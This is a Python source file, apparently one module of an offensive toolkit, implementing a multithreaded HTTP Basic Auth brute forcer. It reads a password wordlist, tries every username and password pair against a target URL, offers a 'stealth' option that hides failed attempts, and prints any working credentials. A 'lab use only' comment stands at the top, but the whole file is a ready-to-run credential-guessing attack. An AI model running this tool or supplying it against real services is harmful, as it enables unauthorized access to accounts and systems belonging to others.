#!/usr/bin/env python3

# ─────────────────────────────────────────────
# modules/credentials/http_brute.py
# Lynkeus Initiative — HTTP Basic Auth Brute Forcer
# Tests credentials against HTTP basic authentication
# Lab use only — run against machines you own
# ─────────────────────────────────────────────

import urllib.request
import urllib.error
import base64
import time
import concurrent.futures

from output.colors import GREEN, RED, YELLOW, CYAN, DIM, BOLD, RESET


def http_auth_attempt(url, username, password, timeout):
    """
    # Sends a single HTTP request with basic auth headers
    # Returns True on 200, False on 401, None on error
    """

    # ── Encode credentials as base64 basic auth ───────────────────
    credentials = base64.b64encode((username + ":" + password).encode()).decode()
    headers     = {"Authorization": "Basic " + credentials}

    try:
        req      = urllib.request.Request(url, headers=headers)
        response = urllib.request.urlopen(req, timeout=timeout)

        # ── 200 OK — credentials accepted ────────────────────────
        if response.status == 200:
            return True

        return False

    except urllib.error.HTTPError as e:
        # ── 401 Unauthorized — wrong credentials ──────────────────
        if e.code == 401:
            return False
        # ── Other HTTP error ──────────────────────────────────────
        return None

    except Exception:
        return None


def run_http_brute(url, usernames, wordlist_path, threads, delay, timeout, stealth):
    """
    # Main HTTP basic auth brute force loop
    """

    # ── Load wordlist ─────────────────────────────────────────────
    try:
        with open(wordlist_path, "r", errors="ignore") as f:
            passwords = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print ("[!] Wordlist not found: " + wordlist_path)
        return

    print ("")
    print (CYAN + "=" * 55 + RESET)
    print (BOLD + "  HTTP BASIC AUTH BRUTE FORCER" + RESET)
    print (CYAN + "=" * 55 + RESET)
    print ("  Target    : " + BOLD + url + RESET)
    print ("  Usernames : " + str(len(usernames)))
    print ("  Passwords : " + str(len(passwords)))
    print ("  Stealth   : " + (GREEN + "ON" if stealth else DIM + "OFF") + RESET)
    print (CYAN + "-" * 55 + RESET)
    print ("")

    found = []

    for username in usernames:

        print (YELLOW + "[*] Testing username: " + username + RESET)

        with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:

            futures = {
                executor.submit(http_auth_attempt, url, username, password, timeout): password
                for password in passwords
            }

            for future in concurrent.futures.as_completed(futures):
                password = futures[future]
                result   = future.result()

                if result is True:
                    print ("")
                    print (GREEN + BOLD + "  [+] VALID CREDENTIALS FOUND" + RESET)
                    print (GREEN + "      Username : " + username + RESET)
                    print (GREEN + "      Password : " + password + RESET)
                    print ("")
                    found.append({"username": username, "password": password})

                    for f in futures:
                        f.cancel()
                    break

                else:
                    if not stealth:
                        print (RED + "  [-] " + username + ":" + password + RESET)

                if delay > 0:
                    time.sleep(delay)

    # ── Summary ───────────────────────────────────────────────────
    print (CYAN + "-" * 55 + RESET)

    if found:
        print (GREEN + BOLD + "  [+] " + str(len(found)) + " valid credential(s) found." + RESET)
        for cred in found:
            print (GREEN + "      " + cred["username"] + " : " + cred["password"] + RESET)
    else:
        print (RED + "  [-] No valid credentials found." + RESET)

    print (CYAN + "=" * 55 + RESET)
    print ("")

    return found
